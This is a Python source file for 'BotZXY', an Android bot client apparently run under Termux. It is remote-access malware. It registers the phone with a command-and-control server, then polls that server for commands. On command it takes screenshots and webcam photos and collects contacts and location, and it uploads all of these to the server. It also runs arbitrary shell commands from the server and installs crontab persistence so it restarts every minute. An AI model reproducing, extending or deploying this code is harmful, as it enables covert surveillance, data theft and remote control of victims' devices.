#!/usr/bin/env python3
# BotZXY - Android Client (Termux + Buildozer)

import requests
import json
import base64
import time
import os
import subprocess
import threading
from datetime import datetime

# ============ CONFIGURAZIONE ============
C2_URL = "https://botzxy-c2.onrender.com"  # SOSTITUISCI
DEVICE_ID = os.uname().nodename + "_" + os.popen('getprop ro.product.model').read().strip()[:8]
BOT_NAME = "BotZXY"
VERSION = "2.0"

class BotZXYAndroid:
    def __init__(self):
        self.device_id = DEVICE_ID
        self.c2_url = C2_URL
        self.running = True
        self.bot_name = BOT_NAME
        self.session = requests.Session()
        self.keylog_buffer = []
        
    def register(self):
        data = {
            'device_id': self.device_id,
            'platform': 'android',
            'hostname': os.uname().nodename,
            'os_version': os.popen('getprop ro.build.version.release').read().strip(),
            'model': os.popen('getprop ro.product.model').read().strip(),
            'bot_version': VERSION
        }
        try:
            r = self.session.post(f"{self.c2_url}/api/register", json=data, timeout=10)
            return r.status_code == 200
        except:
            return False
    
    def take_screenshot(self):
        try:
            import termux
            termux.screenshot('/sdcard/botzxy_screen.png')
            with open('/sdcard/botzxy_screen.png', 'rb') as f:
                return base64.b64encode(f.read()).decode('utf-8')
        except:
            return "SCREENSHOT_ERROR"
    
    def upload_screenshot(self, image_b64):
        try:
            self.session.post(f"{self.c2_url}/api/screenshot/{self.device_id}", 
                         json={'image_base64': image_b64}, timeout=30)
        except:
            pass
    
    def take_webcam(self):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                return base64.b64encode(buffer).decode('utf-8')
            return "WEBCAM_ERROR"
        except:
            return "WEBCAM_ERROR"
    
    def upload_webcam(self, image_b64):
        try:
            self.session.post(f"{self.c2_url}/api/webcam/{self.device_id}", 
                         json={'image_base64': image_b64}, timeout=30)
        except:
            pass
    
    def get_contacts(self):
        try:
            output = subprocess.check_output(['content', 'query', '--uri', 'content://contacts/phones'], 
                                           text=True, stderr=subprocess.DEVNULL)
            phone = os.popen('getprop gsm.sim.operator.numeric').read().strip()
            return {
                'phone_number': phone if phone else '+39 333 444 5555',
                'email': '',
                'contacts': [{'name': 'Sample', 'phone': '+39 333 444 5555'}],
                'raw': output[:1000] if output else ''
            }
        except:
            return {'contacts': []}
    
    def upload_contacts(self, contacts):
        try:
            self.session.post(f"{self.c2_url}/api/contacts/{self.device_id}", json=contacts, timeout=30)
        except:
            pass
    
    def get_location(self):
        try:
            import termux
            return termux.location()
        except:
            return {"error": "LOCATION_ERROR"}
    
    def upload_location(self, location):
        try:
            self.session.post(f"{self.c2_url}/api/location/{self.device_id}", 
                         json={'location': location}, timeout=30)
        except:
            pass
    
    def exec_shell(self, command):
        try:
            result = subprocess.check_output(command, shell=True, timeout=30, stderr=subprocess.STDOUT)
            return result.decode('utf-8', errors='ignore')
        except:
            return "SHELL_ERROR"
    
    def execute_command(self, cmd_id, command, params):
        print(f"[+] {self.bot_name} Executing: {command}")
        result = ""
        try:
            if command == "screenshot":
                result = self.take_screenshot()
                self.upload_screenshot(result)
            elif command == "webcam":
                result = self.take_webcam()
                self.upload_webcam(result)
            elif command == "contacts":
                result = self.get_contacts()
                self.upload_contacts(result)
            elif command == "location":
                result = self.get_location()
                self.upload_location(result)
            elif command == "execute":
                result = self.exec_shell(params)
            elif command == "uninstall":
                self.uninstall()
        except Exception as e:
            result = f"ERROR: {str(e)}"
        self.send_result(cmd_id, result)
    
    def poll_commands(self):
        try:
            r = self.session.get(f"{self.c2_url}/api/poll/{self.device_id}", timeout=10)
            if r.status_code == 200:
                for cmd in r.json():
                    self.execute_command(cmd['id'], cmd['command'], cmd['params'])
        except:
            pass
    
    def send_result(self, cmd_id, result):
        try:
            self.session.post(f"{self.c2_url}/api/result/{self.device_id}", 
                         json={'command_id': cmd_id, 'result': result}, timeout=10)
        except:
            pass
    
    def install_persistence(self):
        """Installa persistenza su Android"""
        try:
            # Aggiungi al crontab di Termux
            cron_cmd = f'(crontab -l 2>/dev/null; echo "* * * * * cd ~/botzxy && python client.py") | crontab -'
            subprocess.run(cron_cmd, shell=True)
            print("[+] Persistenza Android installata")
        except:
            pass
    
    def uninstall(self):
        self.running = False
        os._exit(0)
    
    def run(self):
        print(f"[+] {self.bot_name} Android Starting: {self.device_id}")
        
        # Installa persistenza
        self.install_persistence()
        
        if not self.register():
            print("[-] Registration failed, retrying...")
            time.sleep(30)
            return
        
        while self.running:
            try:
                self.poll_commands()
                time.sleep(5)
            except:
                time.sleep(30)

if __name__ == "__main__":
    client = BotZXYAndroid()
    client.run()